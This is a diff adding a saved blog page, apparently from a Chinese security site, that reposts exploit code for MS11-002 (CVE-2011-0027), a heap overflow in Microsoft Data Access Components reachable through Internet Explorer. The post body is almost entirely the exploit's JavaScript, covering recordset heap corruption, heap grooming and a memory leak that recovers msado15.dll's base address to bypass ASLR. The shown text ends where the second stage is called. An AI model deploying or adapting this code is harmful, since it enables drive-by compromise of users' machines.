@@ -1,0 +1,1715 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>【Exp】MS11-002 网马溢出样本 Html源码 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="MS11-002：Microsoft 数据访问组件中的漏洞，MS11-002: Microsoft Data Access Components Vulnerability。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta name="keywords" content="MS11-002：Microsoft 数据访问组件中的漏洞,MS11-002: Microsoft Data Access Components Vulnerability,Nuclear&#39;Atk,Nuclear&#39;Atk 个人博客,Nuclear&#39;Atk 文章." />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/1091/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="【Exp】MS11-002 网马溢出样本 Html源码" />
+<meta property="og:description" content="MS11-002：Microsoft 数据访问组件中的漏洞，MS11-002: Microsoft Data Access Components Vulnerability。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/1091/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2011-01-14T14:26:00&#43;08:00" />
+<meta property="article:modified_time" content="2011-01-14T14:26:00&#43;08:00" />
+
+<meta itemprop="name" content="【Exp】MS11-002 网马溢出样本 Html源码">
+<meta itemprop="description" content="MS11-002：Microsoft 数据访问组件中的漏洞，MS11-002: Microsoft Data Access Components Vulnerability。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"><meta itemprop="datePublished" content="2011-01-14T14:26:00&#43;08:00" />
+<meta itemprop="dateModified" content="2011-01-14T14:26:00&#43;08:00" />
+<meta itemprop="wordCount" content="4654">
+<meta itemprop="keywords" content="EXP,Html,溢出,源码,app,ASP,bug,exe,Exploit,HTTP,IE,IP,js,Microsoft,NDS,Root,SEO,Shell,URL,Wiki," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="【Exp】MS11-002 网马溢出样本 Html源码"/>
+<meta name="twitter:description" content="MS11-002：Microsoft 数据访问组件中的漏洞，MS11-002: Microsoft Data Access Components Vulnerability。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">【Exp】MS11-002 网马溢出样本 Html源码</h1>
+      
+      <div class="post-meta">
+        <time datetime="2011-01-14" class="post-time">
+          2011-01-14
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/exp/"> EXP </a>
+            <a href="https://lcx.cc/categories/html/"> Html </a>
+            <a href="https://lcx.cc/categories/%E6%BA%A2%E5%87%BA/"> 溢出 </a>
+            <a href="https://lcx.cc/categories/%E6%BA%90%E7%A0%81/"> 源码 </a>
+            
+          </div>
+        <span class="more-meta"> 约 4654 字 </span>
+          <span class="more-meta"> 预计阅读 10 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<P>MS11-002: Microsoft Data Access Components Vulnerability(MS11-002：Microsoft 数据访问组件中的漏洞) <br />
+EDB-ID: 15984 <br />
+CVE: 2011-0027 <br />
+OSVDB-ID: N/A  <br />
+Author: Peter Vreugdenhil <br />
+Published: 2011-01-12 <br />
+Verified: √ <br />
+Exploit Code: Vulnerable <br />
+App: N/A  <br />
+From: http://www.exploit-db.com/exploits/15984/</P>
+<P>
+<TABLE style="BORDER-RIGHT: #cccccc 1px dotted; TABLE-LAYOUT: fixed; BORDER-TOP: #cccccc 1px dotted; BORDER-LEFT: #cccccc 1px dotted; BORDER-BOTTOM: #cccccc 1px dotted" cellSpacing=0 cellPadding=6 width="95%" align=center border=0>
+<TBODY>
+<TR>
+<TD style="WORD-WRAP: break-word" bgColor=#f3f3f3>
+<P><FONT style="FONT-WEIGHT: bold; COLOR: #990000">Code：</FONT></P>
+<P>view sourceprint?&lt;html xmlns:t = "urn:schemas-microsoft-com:time"&gt;&nbsp; </P>
+<P>&nbsp; &lt;head&gt;&nbsp; </P>
+<P>&nbsp; &lt;meta name="License" content="Q Public License;http://en.wikipedia.org/wiki/Q_Public_License"&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;style&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; .body {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #test {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;/style&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;script src="heapLib.js"&gt;&lt;/script&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; &lt;script&gt;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; // This code has been released under the Q Public License by Trolltech&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; // http://en.wikipedia.org/wiki/Q_Public_License&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; // Source: http://vreugdenhilresearch.nl/ms11-002-pwn2own-heap-overflow/&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>var StartTime = new Date();&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>var FinalHeapSpraySize = 900;&nbsp; </P>
+<P>//var SmallHoleSize = 0x1F0;&nbsp; </P>
+<P>var SmallHoleSize = 0x240;&nbsp; </P>
+<P>var GlobalRowCounter = 0;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>var localxmlid1;&nbsp; </P>
+<P>var localxmlid2;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>var localxmlid3;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>var localxmlid5;&nbsp;&nbsp;&nbsp; </P>
+<P>var adobase = 0;&nbsp; </P>
+<P>var finalspray = '';&nbsp; </P>
+<P>var heap = null;&nbsp; </P>
+<P>var ExpoitTime = 10;&nbsp; </P>
+<P>var CurrentHeapSpraySize = 0;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>function Start() {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; FaseOne();&nbsp; </P>
+<P>}&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>function FaseOne() {&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid1 = document.getElementById('xmlid1').recordset;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid2 = document.getElementById('xmlid2').recordset;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid3 = document.getElementById('xmlid3').recordset;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid5 = document.getElementById('xmlid5').recordset;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid2.CacheSize = 0x40000358;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid1.CacheSize = SmallHoleSize;;&nbsp;&nbsp; //small hole?&nbsp; </P>
+<P>&nbsp; localxmlid1.AddNew(["AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"], ["c"]);&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid5.AddNew(["BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"], ["c"]);&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; var my1field = localxmlid5.Fields.Item(0);&nbsp; </P>
+<P>&nbsp; localxmlid1.MoveFirst();&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid2.AddNew(["BBBB"], ["c"]);&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid1.Close();&nbsp; </P>
+<P>&nbsp; CollectGarbage();&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid3.MoveFirst();&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; void(Math.atan2(0xbabe, ('###################### 2 Move First').toString()));&nbsp; </P>
+<P>&nbsp; localxmlid2.MoveFirst();&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; void(Math.atan2(0xbabe, ('###################### 5 Move First').toString()));&nbsp; </P>
+<P>&nbsp; localxmlid5.CacheSize = 0x40000008;&nbsp; </P>
+<P>&nbsp; localxmlid5.MoveFirst();&nbsp; </P>
+<P>&nbsp; localxmlid3.AddNew(["MyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLong"], ["cccccuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuFINDMEccccc"]);&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; var localxmlid4 = document.getElementById('xmlid4').recordset;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid4.AddNew(["bb"], ["c"]);&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid4.MoveNext();&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; var localxmlid6 = document.getElementById('xmlid6').recordset;&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid6.AddNew(["CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC"], ["c"]);&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; localxmlid2.MoveFirst();&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; Math.tan(1);&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; document.getElementById('textfaseone').innerText = 'Setting up data for ASLR evasion:';&nbsp; </P>
+<P>&nbsp; if(GlobalRowCounter &lt; 0x10120) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; window.setTimeout(IncreaseRowCounter, 100);&nbsp; </P>
+<P>&nbsp; }&nbsp; </P>
+<P>}&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>function IncreaseRowCounter() {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; //alert('IncreaseRowCounter: ' + GlobalRowCounter)&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; if(GlobalRowCounter &lt; 0x10120) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; for(i = 0; i &lt; 0x300; i++) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GlobalRowCounter++;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localxmlid2.AddNew(["BBBB"], ["c"]);&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localxmlid2.Delete();&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; }&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; var percentcomplete = Math.round(GlobalRowCounter /0x10120 * 100);&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; document.getElementById('progressfaseone').innerText = percentcomplete + "%";&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; window.setTimeout(IncreaseRowCounter, 100);&nbsp; </P>
+<P>&nbsp; }&nbsp; </P>
+<P>&nbsp; else {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; document.getElementById('textfaseonedone').innerText = 'Now searching memory for suitable vtable. Please wait...';&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; window.setTimeout(FindADOBase, 100);&nbsp; </P>
+<P>&nbsp; }&nbsp; </P>
+<P>}&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>function FindADOBase() {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; //alert('FindADOBase');&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; var myfield = localxmlid3.Fields.Item(1);&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; for(i = 0; i &lt; 0xDF6; i++) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localxmlid2.AddNew(["BBBB"], ["c"]);&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localxmlid2.MoveFirst();&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(myfield.Name != "MyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLongMyDataField1MustBeLong") {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; }&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; //alert('done first');&nbsp; </P>
+<P>&nbsp;&nbsp; </P>
+<P>&nbsp; void(Math.atan2(0xbabe, ('###################### Add untill vftable 2').toString()));&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp; var vftable1 = null;&nbsp; </P>
+<P>&nbsp; var vftable2 = null;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; for(i = 0; i &lt; 0xAE0; i++) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; void(Math.atan2(0xbabe, ('add row: ' + i).toString()));&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localxmlid2.AddNew(["BBBB"], ["c"]);&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; localxmlid2.MoveFirst();&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //if(i &gt; 10) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //&nbsp; document.forms[0].myresult.value += i.toString(16) + " : " + escape(myfield.name.substr((2 * i) + 4, 8)) + " : "&nbsp; + myfield.name.length + "\n";&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //}&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(escape(myfield.name.substr((2 * i) + 4, 2)).match(/uAD68/)) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vftable1 = escape(myfield.name.substr((2 * i) + 4, 2)).replace(/%u(\w\w\w\w)%u(\w\w\w\w)/, "$2$1");&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(escape(myfield.name.substr((2 * i) + 4, 2)).match(/uD738/)) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; vftable2 = escape(myfield.name.substr((2 * i) + 4, 2)).replace(/%u(\w\w\w\w)%u(\w\w\w\w)/, "$2$1");&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(vftable1&nbsp; &amp;&amp; vftable2) {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp; }&nbsp; </P>
+<P>&nbsp;&nbsp; //document.forms[0].myresult.value += "\n\nVFTABLES: " + vftable1 + " : " + vftable2 + "\n\n\n";&nbsp; </P>
+<P>&nbsp;&nbsp; //alert(vftable1);&nbsp; </P>
+<P>&nbsp;&nbsp; if((parseInt(vftable1,16) - 0x1AD68) == (parseInt(vftable2,16) - 0xD738)) {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; adobase = parseInt(vftable1,16) - 0x1AD68;&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; document.getElementById('textfoundaddress').innerText = 'Found base address of &lt;censored&gt;.dll: 0x&lt;censored&gt;';// + adobase.toString(16);&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; FaseTwo();&nbsp; </P>
+<P>&nbsp;&nbsp; }&nbsp; </P>
+<P>&nbsp;&nbsp; else {&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp; alert('sadly we failed to read the base address of msado15.dll :( ');&nbsp;&nbsp;&nbsp; </P>
+<P>&nbsp;&nbsp; }&nbsp; </P>
+<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
+<P>}&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </P>
